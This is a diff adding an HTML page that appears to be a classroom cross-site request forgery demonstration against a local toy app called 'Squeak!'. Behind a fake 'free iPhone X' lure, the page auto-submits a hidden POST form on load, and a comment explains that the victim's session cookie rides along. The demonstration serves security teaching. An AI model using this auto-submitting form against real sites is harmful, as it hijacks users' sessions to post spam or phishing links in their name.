@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Get The iPhone X FREE!</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 15vh; }
+    h1 { font-size: 2em; }
+  </style>
+</head>
+<body onload="document.forms[0].submit()">
+  <h1>Get The iPhone X FREE!</h1>
+  <p>Worth $999. A decade on and still innovating.</p>
+
+  <!--
+    This form targets Squeak!'s real /squeak endpoint on a different
+    origin (https://localhost:8000). It auto-submits the instant this
+    page loads - no click needed. If a Squeak! session cookie is sitting
+    in the victim's browser, it is attached automatically and the
+    server has no way to tell this apart from a genuine squeak.
+  -->
+  <form action="https://localhost:8000/squeak" method="POST" style="display:none;">
+    <input type="hidden" name="squeak"
+      value="Click here to get the iPhone X FREE! http://localhost:5500/">
+  </form>
+</body>
+</html>
